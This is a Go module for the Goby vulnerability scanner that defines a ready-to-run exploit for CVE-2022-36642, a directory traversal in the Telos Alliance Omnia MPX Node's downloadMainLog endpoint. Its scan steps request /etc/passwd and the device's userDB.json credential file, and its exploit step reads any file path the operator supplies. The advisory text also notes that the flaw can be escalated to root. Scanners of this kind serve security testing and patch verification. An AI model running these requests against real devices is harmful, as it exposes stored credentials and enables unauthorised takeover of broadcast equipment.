package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Telos Alliance Omnia MPX Node downloadMainLog fnameFile Reading Vulnerability(CVE-2022-36642)",
    "Description": "<p>Telos Alliance Omnia MPX Node is a special hardware codec of Telos Alliance of the United States. Ability to leverage Omnia μ The MPXTM algorithm sends or receives complete FM signals at data rates as low as 320 kbps, making it ideal for networks with limited capacity, including IP radios.</p><p>There is a security vulnerability in Telos Alliance Omnia MPX Node 1.5.0+r1 and earlier versions, which originates from the local file disclosure vulnerability in/appConfig/userDB.json. An attacker uses this vulnerability to elevate privileges to root and execute arbitrary commands.</p>",
    "Product": "Telos Alliance Omnia MPX Node",
    "Homepage": "https://www.telosalliance.com/radio-processing/audio-interfaces/omnia-mpx-node",
    "DisclosureDate": "2022-12-23",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"Omnia MPX\"",
    "GobyQuery": "body=\"Omnia MPX\"",
    "Level": "3",
    "Impact": "<p>There is a security vulnerability in Telos Alliance Omnia MPX Node 1.5.0+r1 and earlier versions, which originates from the local file disclosure vulnerability in/appConfig/userDB.json. An attacker uses this vulnerability to elevate privileges to root and execute arbitrary commands.</p>",
    "Recommendation": "<p>The manufacturer has released vulnerability fixes, please pay attention to the updates: <a href=\"https://www.telosalliance.com/radio-processing/audio-interfaces/omnia-mpx-node\">https://www.telosalliance.com/radio-processing/audio-interfaces/omnia-mpx-node</a></p>",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36642"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "//config/MPXnode/www/appConfig/userDB.json",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:[x*]:0:0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"username\":",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"password\":",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"mustChangePwd\":",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"roleUser\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/logs/downloadMainLog?fname=../../../../../../../{{{filePath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2022-36642"
    ],
    "CNNVD": [
        "CNNVD-202209-139"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.6",
    "Translation": {
        "CN": {
            "Name": "Telos Alliance Omnia MPX Node 硬件编解码器 downloadMainLog 文件 fname 参数文件读取漏洞（CVE-2022-36642）",
            "Product": "Telos Alliance Omnia MPX Node",
            "Description": "<p>Telos Alliance Omnia MPX Node是美国Telos Alliance公司的一个专用硬件编解码器。能够利用 Omnia μMPXTM 算法以低至 320 kbps 的数据速率发送或接收完整的 FM 信号，非常适合容量有限的网络（包括 IP 无线电）。</p><p>Telos Alliance Omnia MPX Node 1.5.0+r1版本及之前版本存在安全漏洞，该漏洞源于/appConfig/userDB.json 存在本地文件泄露漏洞。攻击者利用该漏洞提升权限到 root 并执行任意命令。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.telosalliance.com/radio-processing/audio-interfaces/omnia-mpx-node\" target=\"_blank\">https://www.telosalliance.com/radio-processing/audio-interfaces/omnia-mpx-node</a><br></p>",
            "Impact": "<p>Telos Alliance Omnia MPX Node 1.5.0+r1版本及之前版本存在安全漏洞，该漏洞源于/appConfig/userDB.json 存在本地文件泄露漏洞。攻击者利用该漏洞提升权限到 root 并执行任意命令。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Telos Alliance Omnia MPX Node downloadMainLog fnameFile Reading Vulnerability(CVE-2022-36642)",
            "Product": "Telos Alliance Omnia MPX Node",
            "Description": "<p>Telos Alliance Omnia MPX Node is a special hardware codec of Telos Alliance of the United States. Ability to leverage Omnia μ The MPXTM algorithm sends or receives complete FM signals at data rates as low as 320 kbps, making it ideal for networks with limited capacity, including IP radios.</p><p>There is a security vulnerability in Telos Alliance Omnia MPX Node 1.5.0+r1 and earlier versions, which originates from the local file disclosure vulnerability in/appConfig/userDB.json. An attacker uses this vulnerability to elevate privileges to root and execute arbitrary commands.</p>",
            "Recommendation": "<p>The manufacturer has released vulnerability fixes, please pay attention to the updates: <a href=\"https://www.telosalliance.com/radio-processing/audio-interfaces/omnia-mpx-node\" target=\"_blank\">https://www.telosalliance.com/radio-processing/audio-interfaces/omnia-mpx-node</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">There is a security vulnerability in Telos Alliance Omnia MPX Node 1.5.0+r1 and earlier versions, which originates from the local file disclosure vulnerability in/appConfig/userDB.json. An attacker uses this vulnerability to elevate privileges to root and execute arbitrary commands.</span><br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}